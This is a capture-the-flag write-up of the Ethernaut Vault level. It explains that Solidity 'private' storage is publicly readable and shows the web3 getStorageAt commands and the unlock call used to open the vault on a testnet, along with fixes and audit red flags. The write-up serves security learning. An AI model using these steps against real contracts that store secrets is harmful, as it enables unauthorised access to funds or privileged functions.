# Ethernaut Vault — Private Storage Is Not Secret

## Summary

The Vault level demonstrates that `private` variables in Solidity are not secret.

The contract stores a password in a `private` state variable. Even though other contracts cannot directly read the variable through a normal Solidity function, the raw storage slot is still publicly readable from the blockchain.

The exploit reads the password directly from contract storage and uses it to unlock the vault.

## Bug Pattern

On-chain secret exposure / sensitive data stored in public blockchain storage.

## Vulnerable Assumption

The contract assumes that marking a variable as `private` makes the value hidden from users.

This assumption is wrong.

In Solidity, `private` only restricts access from other Solidity contracts. It does not hide data from the blockchain.

## Vulnerable Logic

The contract stores the password in contract storage:

```solidity
bool public locked;
bytes32 private password;
```

The `unlock()` function checks whether the provided password matches the stored password:

```solidity
function unlock(bytes32 _password) public {
    if (password == _password) {
        locked = false;
    }
}
```

The problem is that the password can be read from raw storage.

## Attack Path

1. Check that the vault is locked.
2. Read storage slot `0` to confirm the `locked` value.
3. Read storage slot `1` to get the password.
4. Call `unlock(password)`.
5. Confirm that `locked` changed from `true` to `false`.

## Web3 Commands Used

```javascript
await contract.locked()
```

This checks whether the vault is locked.

```javascript
await web3.eth.getStorageAt(instance, 0)
```

This reads storage slot `0`, where the `locked` boolean is stored.

```javascript
await web3.eth.getStorageAt(instance, 1)
```

This reads storage slot `1`, where the password is stored.

```javascript
const password = await web3.eth.getStorageAt(instance, 1)
```

This saves the password from storage slot `1`.

```javascript
await contract.unlock(password)
```

This calls the vulnerable `unlock()` function using the password read from storage.

## Evidence

Before the exploit:

```text
locked = true
```

Storage slot `0` showed the vault was locked:

```text
0x0000000000000000000000000000000000000000000000000000000000000001
```

Storage slot `1` contained the password:

```text
0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

After calling `unlock(password)`, the vault became unlocked:

```text
locked = false
```

## Exploit Transaction

```text
Network:
Sepolia Testnet

Transaction Hash:
0x39bfd5b8194efd8e575407534e8ee5ab2e0e6453503cdd2e33563cda21fe289f

Function Called:
unlock(bytes32 _password)

Argument:
0x412076657279207374726f6e67207365637265742070617373776f7264203a29

Result:
locked changed from true to false
```

## Root Cause

The root cause is storing secret information directly on-chain.

The visibility keyword `private` does not provide secrecy. It only controls access at the Solidity code level.

Blockchain storage is public and can be inspected by anyone.

## Impact

An attacker can read the password from storage and unlock the vault without knowing the password beforehand.

In real contracts, this pattern could expose:

```text
- passwords
- hidden roles
- whitelist secrets
- NFT reveal data
- game answers
- random seeds
- commit secrets
- privileged configuration values
```

## Fix

Do not store secrets directly on-chain.

Better approaches include:

```text
- commit-reveal schemes
- off-chain secrets with signatures
- cryptographic proofs
- delayed reveal mechanisms
- storing only hashes when appropriate
```

Important: even storing a hash can be unsafe if the secret is weak or guessable.

## Real-World Relevance

Auditors should treat any “secret” stored on-chain as public.

If a protocol depends on users not knowing a value stored in contract storage, the design is probably broken.

Common red flags:

```text
- private password
- private answer
- hidden random number
- secret whitelist value
- unrevealed NFT metadata stored too early
```

## What I Learned

- `private` does not mean secret.
- Contract storage can be read with `web3.eth.getStorageAt`.
- Raw storage slots can reveal sensitive values.
- A read operation can prepare an exploit, but the actual state change happens in the write transaction.
- Security assumptions must be based on blockchain visibility, not Solidity visibility keywords.
